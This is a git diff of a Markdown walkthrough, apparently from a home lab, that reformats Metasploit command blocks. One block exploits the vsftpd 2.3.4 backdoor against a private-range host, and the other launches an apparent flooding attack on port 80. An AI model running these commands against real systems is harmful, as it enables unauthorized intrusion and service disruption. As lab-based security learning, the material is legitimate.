@@ -71,16 +71,11 @@ This version contains a known vulnerability.
 ---
 
 ##  Exploitation
-```
+
+```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
-```
-```
 set RHOSTS 192.168.222.131 
-```
-```
 set lhost 192.168.222.129
-```
-```
 run
 ```
 
@@ -119,6 +114,7 @@ set RHOSTS 192.168.222.131
 set RPORT 80
 set THREADS 50
 set sockets 1000000
+run
 ```
 
 ### Screenshot: Setup
